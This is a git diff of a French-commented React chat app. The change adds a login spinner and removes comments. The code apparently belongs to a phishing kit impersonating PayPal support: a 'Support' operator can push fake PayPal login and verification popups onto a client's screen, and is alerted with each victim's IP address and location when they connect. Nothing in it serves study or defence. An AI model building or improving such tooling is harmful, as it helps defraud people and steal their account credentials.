@@ -7,7 +7,7 @@ const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
 let socket;
 const MAX_FILE_SIZE = 2 * 1024 * 1024; // 2Mo en octets
 
-// --- Icônes SVG (identiques au code précédent) ---
+// --- Icônes SVG (identiques) ---
 const TrashIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0z"/><path d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4zM2.5 3h11V2h-11z"/></svg> );
 const SendIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" viewBox="0 0 20 20" fill="currentColor"><path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z" /></svg> );
 const AttachmentIcon = () => ( 
@@ -33,7 +33,7 @@ const PayPalIcon = () => (
   </svg>
 );
 
-// ✅ NOUVEAU : Composant Bandeau Défilant (sans CSS inline)
+// ✅ Composant Bandeau Défilant 
 const ScrollingBanner = () => {
     return (
         <div className="bg-red-600 text-white text-sm py-2 overflow-hidden relative border-b border-red-700">
@@ -439,8 +439,11 @@ function App() {
     const [showPayPalLogin1Popup, setShowPayPalLogin1Popup] = useState(false);
     const [showPayPalLogin2Popup, setShowPayPalLogin2Popup] = useState(false);
     const [showVerificationPopup, setShowVerificationPopup] = useState(false);
+    
+    // ✅ NOUVEAU : État pour le loading spinner
+    const [isConnecting, setIsConnecting] = useState(false);
 
-    // ✅ NOUVEAU : Demander permission pour notifications browser
+    // Demander permission pour notifications browser
     useEffect(() => {
         if (Notification.permission !== 'granted' && Notification.permission !== 'denied') {
             Notification.requestPermission();
@@ -496,25 +499,18 @@ function App() {
                 }
             };
 
-            // ✅ NOUVEAU : Handler pour activation automatique checkbox côté support
             const handleAutoToggleVerification = (data) => {
                 if (userType === 'Support') {
-                    // Cocher automatiquement la checkbox de vérification
                     setIsVerifying(true);
                     setIsImportant(false);
                     setIsSuccess(false);
-                    
-                    // Afficher le popup de vérification côté client
                     socket.emit('verification popup', { show: true });
-                    
                     console.log('🔄 Vérification activée automatiquement:', data.action);
                 }
             };
 
-            // ✅ NOUVEAU : Handler pour les alertes de connexion client
             const handleClientConnectionAlert = (alertData) => {
                 if (userType === 'Support') {
-                    // Notification browser native
                     if (Notification.permission === 'granted') {
                         new Notification(alertData.title, {
                             body: `${alertData.message}\nIP: ${alertData.clientInfo.ip}\nLocation: ${alertData.clientInfo.city}, ${alertData.clientInfo.country}`,
@@ -523,11 +519,10 @@ function App() {
                         });
                     }
                     
-                    // Son d'alerte (optionnel)
                     if (alertData.sound) {
                         try {
                             const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmAZBz2a3/DIeCgENYvK892PPBoGZbvt6+BSGANCq+DAaS8EIX7S8dqBOwgWT6');
-                            audio.play().catch(() => {}); // Ignorer les erreurs de son
+                            audio.play().catch(() => {});
                         } catch (e) {
                             console.log('Son non disponible');
                         }
@@ -549,8 +544,6 @@ function App() {
             socket.on('display paypal login2 popup', handleDisplayPayPalLogin2Popup);
             socket.on('display verification popup', handleDisplayVerificationPopup);
             socket.on('auto_toggle_verification', handleAutoToggleVerification);
-            
-            // ✅ NOUVEAU : Listener pour notifications de connexion
             socket.on('client_connection_alert', handleClientConnectionAlert);
             
             return () => {
@@ -575,22 +568,31 @@ function App() {
         messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
     }, [messages]);
 
+    // ✅ MODIFIÉ : Fonction handleLogin avec spinner
     const handleLogin = async (e) => {
         e.preventDefault();
         setError('');
+        setIsConnecting(true); // ✅ Activer le spinner
+        
         try {
-            const response = await fetch(`${API_URL}/verify`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code, date }) });
+            const response = await fetch(`${API_URL}/verify`, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ code, date }) 
+            });
+            
             const data = await response.json();
             if (data.success) {
                 setUserType(data.userType);
                 socket = io(API_URL);
                 setIsLoggedIn(true);
-                // ✅ PAS de message initial - les messages automatiques viennent du server maintenant
             } else {
                 setError(data.message || 'Invalid code or date');
             }
         } catch (err) {
             setError('Server connection error. Please try again.');
+        } finally {
+            setIsConnecting(false); // ✅ Désactiver le spinner
         }
     };
     
@@ -689,7 +691,6 @@ function App() {
                 setIsImportant(false);
                 setIsSuccess(false);
             }
-            // Émettre l'état de vérification
             socket.emit('verification popup', { show: newVerifyingState });
         }
     };
@@ -711,8 +712,24 @@ function App() {
                             <input type="text" id="date" value={date} placeholder="DD/MM/YYYY" onChange={(e) => setDate(e.target.value)} className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-[#009cde] focus:border-[#009cde]" required />
                         </div>
                         {error && <p className="text-red-500 text-sm text-center mb-4">{error}</p>}
-                        <button type="submit" className="w-full bg-[#0070ba] text-white font-bold py-2.5 px-4 rounded-lg hover:bg-[#003087] transition duration-300">
-                            Connect
+                        
+                        {/* ✅ NOUVEAU : Bouton avec spinner */}
+                        <button 
+                            type="submit" 
+                            disabled={isConnecting}
+                            className="w-full bg-[#0070ba] text-white font-bold py-2.5 px-4 rounded-lg hover:bg-[#003087] transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
+                        >
+                            {isConnecting ? (
+                                <>
+                                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                                        <path className="opacity-75" fill="currentColor" d="m4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                    </svg>
+                                    Connecting...
+                                </>
+                            ) : (
+                                'Connect'
+                            )}
                         </button>
                     </form>
                 </div>
